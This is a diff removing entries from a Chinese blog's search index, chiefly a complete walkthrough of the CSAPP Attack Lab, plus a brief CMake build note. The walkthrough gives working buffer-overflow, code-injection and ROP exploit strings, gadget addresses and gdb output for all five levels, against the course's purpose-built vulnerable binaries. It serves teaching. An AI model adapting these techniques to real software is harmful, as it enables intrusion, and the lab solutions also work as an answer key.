@@ -403,217 +403,6 @@
       </tags>
   </entry>
   <entry>
-    <title>源码编译并安装CMake</title>
-    <url>/2020/0726174432.html</url>
-    <content><![CDATA[<p>从官网安装指定版本， 以<code>3.12.1</code>版本为例：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.12/cmake-3.12.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.12.1.tar.gz</span><br><span class="line">cd cmake-3.12.1</span><br><span class="line">./bootstrap</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-
-<p>查看cmake版本，检查是否安装成功</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>CMake</category>
-      </categories>
-      <tags>
-        <tag>CMake</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSAPP 缓冲区溢出实验</title>
-    <url>/2020/0802174715.html</url>
-    <content><![CDATA[<h3 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。</p>
-<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
-<li><p>缓冲区溢出的原理，参考《CSAPP原书第3版》<code>3.10</code>小节</p>
-</li>
-<li><p><code>gdb</code>和<code>objdump</code>使用</p>
-</li>
-<li><p>x86_64下的汇编</p>
-</li>
-</ul>
-<span id="more"></span>
-
-<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>首先获取实验所需文件<code>target1.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
-<p><code>linux</code>下执行<code>tar xvf target1.tar</code>，得到如下文件。每个文件作用简述如下：</p>
-<ul>
-<li><p><code>ctarget</code>：代码注入攻击的程序。</p>
-</li>
-<li><p><code>rtarget</code>：ROP攻击的程序。</p>
-</li>
-<li><p><code>cookie.txt</code>: 记录<code>cookie</code>的值，攻击时需要用到。</p>
-</li>
-<li><p><code>farm.c</code>: 用于ROP攻击寻找<code>gadget</code>的文件。</p>
-</li>
-<li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
-</li>
-</ul>
-<p>实验共有5关，每一关的目标如下：<br><img data-src="/2020/0802174715/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
-<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
-<p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>ctarget</code>中还定义了<code>touch1</code>函数，C代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: you called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>本关的目标是：在<code>getbuf</code>函数返回时，令程序跳转到<code>touch1()</code>而不是从<code>test()</code>正常返回。</p>
-<p>我们需要攻击<code>getbuf</code>函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。</p>
-<p>首先查看<code>getbuf</code>函数的汇编代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转</span><br></pre></td></tr></table></figure>
-
-<p>从<code>sub  0x28 %rsp</code>看出， <code>getbuf</code>函数在栈上分配了<code>40</code>个字节。再看下<code>test</code>函数的汇编代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>
-
-<p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
-<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img data-src="/2020/0802174715/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
-
-<p>构造攻击字符串, 写到文件<code>hex1</code></p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序</span><br></pre></td></tr></table></figure>
-
-<p>利用<code>hex2raw</code>工具将字节码转为字符串，写到文件<code>answer1</code>， 用法如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; hex1 &gt; answer1</span><br></pre></td></tr></table></figure>
-
-<p>执行<code>ctarget</code>程序验证结果，其中<code>-i</code>指定字符串所在文件，<code>-q</code>必选参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-
-<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看<code>touch2</code>代码：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出，我们需要在跳转到<code>touch2</code>的时候将<code>cookie</code>的值作为参数传递。思路如下：</p>
-<ul>
-<li><p>将返回地址改写为栈中的注入代码的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
-</li>
-<li><p>在注入代码中，将<code>cookie</code>值传递到<code>%rdi</code>。因为<code>x86-64</code>汇编使用<code>%rdi</code>作为第一个参数</p>
-</li>
-<li><p>确定<code>touch2</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
-</li>
-</ul>
-<p>首先确定栈的地址，在<code>0x4017af callq 401a40 &lt;Gets&gt;</code>处打断点，查看<code>%rsp</code>值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb ctarget</span><br><span class="line">(gdb) set args -q -i answer1</span><br><span class="line">(gdb) b *0x4017af</span><br><span class="line">Breakpoint 1 at 0x4017af: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14</span><br><span class="line">14      buf.c: No such file or directory.</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>
-
-<p>得到栈的地址为<code>0x5561dc78</code>, 这正是我们注入代码所在的位置。</p>
-<p>接下来需要将<code>cookie</code>值传给<code>%rdi</code>，再跳转到<code>touch2</code>。<code>touch2</code>地址可通过查看汇编代码得到，结果是<code>0x4017ec</code>；跳转到touch2的思路是：<strong>先利用<code>push</code>指令将<code>touch2</code>地址压栈，接着用<code>retq</code>从栈中弹出<code>touch2</code>地址并跳转。</strong></p>
-<p>编写如下注入代码，保存到文件<code>inject2.s</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
-
-<p>执行<code>gcc -c inject2.s</code>, <code>objdump -d inject2.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p>综上，得到我们需要输入的字符串</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image3.png"></p>
-<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>touch3</code>代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>和第二关类似，我们需要传入<code>cookie</code>字符串并跳转到<code>touch3</code>。但需要注意<code>hexmatch</code>函数被调用后，会覆盖一部分<code>getbuf</code>的缓冲区。为了避免这一点，可以将<code>cookie</code>字符串放到<code>test</code>的栈帧里。这一关的思路如下：</p>
-<ul>
-<li><p>将返回地址改写为注入代码所在的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
-</li>
-<li><p>将<code>cookie</code>字符串放到<code>test</code>的栈帧里。在注入代码中，将<code>cookie</code>串的首地址传递到<code>%rdi</code>。</p>
-</li>
-<li><p>确定<code>touch3</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
-</li>
-</ul>
-<p>与第二关类似，编写如下注入代码，保存到文件<code>inject3.s</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处</span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈</span><br><span class="line">retq						# 将touch3地址退栈，并跳转执行touch3</span><br></pre></td></tr></table></figure>
-
-<p>执行<code>gcc -c inject3.s</code>, <code>objdump -d inject3.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p>我第一次写这块汇编代码时，犯了两个错误：</p>
-<ul>
-<li><p>将<code>$0x5561dca8</code>错写成<code>$0x5561dca4</code>, 导致段错误。<strong>注意64位机器上执行压栈和退栈操作，栈指针<code>%rsp</code>应该减去或加上<code>8</code>，而不是<code>4</code></strong></p>
-</li>
-<li><p><code>pushq  $0x4018fa</code>中漏写了<code>$</code>符号，导致压栈的数据不对。<strong>注意对立即数操作时必须加上$符号</strong></p>
-</li>
-</ul>
-<p>用<code>man ascii</code>查表 ，将字符串<code>59b997fa</code>转成ASCII码：<code>35 39 62 39 39 37 66 61</code></p>
-<p>综上，得到我们需要输入字符串</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image4.png"></p>
-<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
-<ul>
-<li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
-<li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
-</ul>
-<p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
-<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img data-src="/2020/0802174715/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
-<ul>
-<li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
-<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img data-src="/2020/0802174715/image6.png"><br><img data-src="/2020/0802174715/image7.png"><br><img data-src="/2020/0802174715/image8.png"><br><img data-src="/2020/0802174715/image9.png"></li>
-</ul>
-<p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
-<p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:   c3                      retq</span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:   c3                      retq</span><br><span class="line"># ......</span><br></pre></td></tr></table></figure>
-
-<p>为了将<code>cookie</code>传给<code>%rdi</code>，可以先将<code>cookie</code>的值写到栈，再利用<code>popq %rdi</code>指令实现。</p>
-<p>查表可知<code>pop</code>的编码在<code>58 ~ 5f</code>。全局搜索后没找到<code>5f c3</code>或<code>5f 90 c3</code>，说明不能用<code>$popq %rdi</code>一步到位；但是可以在<code>addval_219</code>中找到<code>58 90 c3</code>，先将栈中的值弹出传到<code>%rax</code>。记录起始地址为<code>0x4019ab</code>。</p>
-<p>接着想办法把<code>%rax</code>的值传递到<code>%rdi</code>。查表，在gadget中找到<code>48 89 c7</code>，也就是<code>movq %rax, %rdi</code>指令，可以在<code>&lt;addval_273&gt;</code>中找到，而且后面正好跟了<code>c3</code>，记录起始地址为<code>0x4019a2</code>。</p>
-<p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image10.png"></p>
-<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
-<p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
-<p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3</span><br></pre></td></tr></table></figure>
-
-<p>再结合所有<code>gadget</code>，多次尝试后发现一个可行解，如下：</p>
-<ul>
-<li><p>将<code>%rsp</code>传给<code>%rdi</code>，利用<code>mov</code>实现。</p>
-</li>
-<li><p>将偏移传给<code>%rsi</code>， 需利用<code>pop</code>和多个<code>mov</code>实现。偏移量需要在找到所有<code>gadget</code>后通过计算得出。</p>
-</li>
-<li><p>用<code>lea (%rdi,%rsi,1),%rax</code>，将<code>cookie</code>串的首地址传给<code>%rax</code></p>
-</li>
-<li><p>将<code>%rax</code>传给<code>%rdi</code>，利用<code>mov</code>指令</p>
-</li>
-</ul>
-<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><h5 id="1-将-rsp传给-rdi"><a href="#1-将-rsp传给-rdi" class="headerlink" title="1. 将%rsp传给%rdi"></a>1. 将<code>%rsp</code>传给<code>%rdi</code></h5><p>通过<code>movq %rsp,%rax</code>,<code>movq %rax,%rdi</code>实现：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p><code>movq %rsp,%rax</code>编码为<code>48 89 e0</code>, 地址为<code>0x401aad</code>。</p>
-<p><code>movq %rax %rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019a2</code>。</p>
-<h5 id="2-将偏移传给-rsi"><a href="#2-将偏移传给-rsi" class="headerlink" title="2. 将偏移传给$rsi"></a>2. 将偏移传给<code>$rsi</code></h5><p>先将偏移写到栈里，再通过如下<code>4</code>条指令传到<code>$rsi</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %rsi</span><br></pre></td></tr></table></figure>
-
-<p>在以下的<code>gadget</code>中找到这<code>4</code>条指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:   c3                      retq</span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:   c3                      retq</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax</span><br><span class="line">  401a38:   c3                      retq</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p><code>pop %rax</code>编码为<code>58</code>, 地址为<code>0x4019cc</code>。</p>
-<p><code>mov %eax %edx</code>编码为<code>89 c2</code>，地址为<code>0x4019dd</code>。</p>
-<p><code>mov %edx %ecx</code>编码为<code>89 d1</code>，地址为<code>0x401a34</code>。</p>
-<p><code>mov %ecx,%esi</code>编码为<code>89 ce</code>，地址为<code>0x401a13</code>。</p>
-<h5 id="3-将cookie字符串传给-rdi"><a href="#3-将cookie字符串传给-rdi" class="headerlink" title="3. 将cookie字符串传给%rdi"></a>3. 将<code>cookie</code>字符串传给<code>%rdi</code></h5><p>利用<code>lea ($rdi,%rsi,1),%rax</code>，地址为<code>0x4019d6</code>。</p>
-<h5 id="4-将-rax传给-rdi"><a href="#4-将-rax传给-rdi" class="headerlink" title="4. 将%rax传给$rdi"></a>4. 将<code>%rax</code>传给<code>$rdi</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p><code>mov %rax,%rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019c5</code>。</p>
-<p>到此，我们完成了<code>gadget</code>的构造，只需继续在栈中依次填入<code>touch3</code>返回地址，<code>cookie</code>字符串，<code>0</code>(字符串结束标志)，再确定偏移即可。</p>
-<p>偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了<code>9</code>条指令，因此偏移量为<code>72</code>, 即<code>0x48</code></p>
-<p>输入的字符串如下：</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image11.png"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
-<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
-<p><a href="https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/">读厚CSAPP III Attack Lab</a></p>
